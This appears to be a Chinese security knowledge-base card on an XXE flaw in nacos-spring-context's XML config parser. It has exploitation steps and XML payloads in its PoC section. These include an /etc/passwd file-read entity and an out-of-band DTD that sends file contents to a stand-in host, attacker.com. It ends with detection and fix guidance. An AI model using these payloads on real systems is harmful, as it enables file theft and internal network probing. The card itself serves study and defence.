---
id: web-java-xxe-nacos-spring-context-config-parse
title: Nacos-spring-context DefaultXmlConfigParse 未加固 DocumentBuilderFactory 导致配置 XML XXE
type: scenario
domain: web
path: web/generic/xxe
technique: java-documentbuilderfactory-default-xxe
tags:
- xxe
- java
- nacos
- spring
- xml
- external-entity
- file-read
- oob
- config-center
cve: []
severity: high
confidence: medium
status: verified
affected_versions: com.alibaba.nacos:nacos-spring-context 2.1.1 及之前版本
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V57
  verified_at: '2026-11-05T09:03:35+08:00'
  notes: 已对照原文与唯一图片核对：图01 为 zast-ai/vulnerability-reports 中 Alibaba Nacos-spring-context XXE / Report / GotBounty 记录，原文为原始报告翻译；DefaultXmlConfigParse.parse 使用未加固 DocumentBuilderFactory 解析 configText、未禁用 DOCTYPE/外部实体，file:// 有回显与参数实体 OOB 载荷均与原文一致。受影响版本按原文明确写 2.1.1 及之前已设置；原文 CVE 标注待分配，cve 留空正确。原文无端到端 Nacos 环境复现、前提是能写入/影响被解析的 XML 配置，卡内 confidence medium 与触发条件描述合理。PoC未在本机执行；frontmatter无sources/source_url（全库惯例）。
url: /docs/web/generic/xxe/web-java-xxe-nacos-spring-context-config-parse/
draft: false
kb_aliases:
- Nacos-spring-context XXE
- com.alibaba.nacos:nacos-spring-context XXE
- DefaultXmlConfigParse XXE
- Nacos 配置中心 XXE
- Nacos XML 配置外部实体
---

## 一句话结论

`com.alibaba.nacos:nacos-spring-context` 2.1.1 及之前的 `DefaultXmlConfigParse.parse()` 直接使用未加固的 `DocumentBuilderFactory` 解析 XML，未禁用 DOCTYPE/外部实体；凡是把可控 XML（尤其是 Nacos 中的 XML 配置）交给该组件解析的应用，都会触发 XXE，可读取应用服务器本地文件或发起 SSRF，且一份恶意配置会影响所有拉取并解析它的微服务。

## 原理

- XML 允许在 `<!DOCTYPE>` 中声明值为 `file://`、`http://` 等 URI 的外部实体；解析器遇到 `&xxe;` 时会读取该 URI 并把内容替换进文档。
- JDK 的 `DocumentBuilderFactory.newInstance()` 默认允许 DOCTYPE 与外部实体；`DefaultXmlConfigParse` 的 `parse()` 直接 `factory.newDocumentBuilder().parse(new ByteArrayInputStream(configText.getBytes("UTF-8")))`，没有设置 `disallow-doctype-decl`、`external-general-entities`、`external-parameter-entities`、`FEATURE_SECURE_PROCESSING`、`setXIncludeAware(false)`、`setExpandEntityReferences(false)` 等任何安全项（原文所附原始报告代码即如此）。
- 解析结果会经 `recursionXmlToMap`/`mapToProperties` 变成配置 Map，实体替换后的文件内容因此进入配置值；当配置被日志打印、回显到页面或被业务使用时，攻击者即可读到。无回显时可改用参数实体 + 外部 DTD 把 `%file;` 拼进 URL 外带。
- 该组件的定位是把 Nacos 配置转换为 Spring 属性，因此 XML 的来源通常是 Nacos 配置中心或调用方的 XML API/导入功能；这使信任边界从“Nacos 内容默认可信”被打破——能写 Nacos 命名空间配置（弱口令控制台、泄露令牌、越权命名空间）的人可让所有订阅该配置的客户端在解析时访问本机文件或内网。

## 触发条件

- 应用依赖 `com.alibaba.nacos:nacos-spring-context` ≤ 2.1.1；
- 应用使用该组件的 XML 解析路径（`DefaultXmlConfigParse`、`ConfigParseUtils.toProperties` 等）处理 XML 内容；
- 攻击者能影响被解析的 XML：向 Nacos 写入恶意 XML 配置、通过配置导入功能上传 XML、或让应用的 XML API 把请求体交给该解析器；
- 攻击者控制的 XML 会被客户端拉取并解析（配置变更后微服务重载/重启/动态刷新）；
- 无回显场景还需要目标能向外发起 HTTP/DNS 请求。

## 利用步骤

1. 确认目标微服务使用 nacos-spring-context 且会解析 XML 格式配置（依赖版本、配置 dataId/group 的格式）。
2. 取得向目标命名空间写入配置的能力（控制台弱口令/默认口令、令牌泄露、越权）。
3. 上传带外部实体的 XML 配置（如原文的 `xmlSign/Students/Student/Name` 结构），等待客户端拉取/刷新。
4. 有回显时在配置值、日志或业务响应中读取 `/etc/passwd` 等文件；无回显时改用外部 DTD 外带。
5. 也可把实体 URI 换成内网地址探测可达性（SSRF）。

## PoC

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xmlSign>
  <Students>
    <Student>
      <Name>&xxe;</Name>
      <Num>1006010022</Num>
      <Classes>major-1</Classes>
    </Student>
  </Students>
</xmlSign>
```

无回显时使用外部 DTD：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<xmlSign><Students><Student><Name>test</Name></Student></Students></xmlSign>
```

```text
# evil.dtd
<!ENTITY % file SYSTEM "file:///path/to/sensitive/config">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

## 变体与关联

- 入口变体：Nacos 配置中心写入 → 所有客户端解析（影响面最大）；配置导入功能；直接调用组件的 XML API。
- 回显变体：实体内容进入配置值/日志/页面；无回显用 OOB 参数实体外带（见 [[web-generic-xxe-oob-exfil]]）。
- 通用模式：[[web-generic-xxe-inband-file-read-default-insecure]]（Java 解析器默认不安全导致有回显文件读取）与 [[web-generic-xxe-reflected-xml-ssrf-internal-service]]（实体触发 SSRF）。
- 关联风险：能写 Nacos 配置往往还能造成更大范围的配置篡改；XXE 的价值在于把“配置写权限”升级为“客户端主机文件读取/内网探测”，并在多租户/受限命名空间场景中横向。

## 检测与防御

- 检测：Nacos 配置内容或请求体中出现 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、`http://`；应用日志/响应出现 `/etc/passwd` 等系统文件内容；客户端进程向异常域名发起 DNS/HTTP 请求；配置发布记录中出现 XML 格式且含 DTD 的变更。
- 修复：升级 nacos-spring-context 到修复版本（原文未给出具体修复版本号）；解析前显式设置 `http://apache.org/xml/features/disallow-doctype-decl=true`，关闭 `external-general-entities`/`external-parameter-entities`，启用 `FEATURE_SECURE_PROCESSING`，并设置 `setXIncludeAware(false)`、`setExpandEntityReferences(false)`。
- 加固：限制 Nacos 控制台/API 访问与命名空间写权限，启用强口令与鉴权；对配置内容做格式白名单与 DOCTYPE 过滤；限制应用出网与文件读权限。原文提到的 `-DentityExpansionLimit=0` 只是部分缓解，不能替代禁用外部实体。
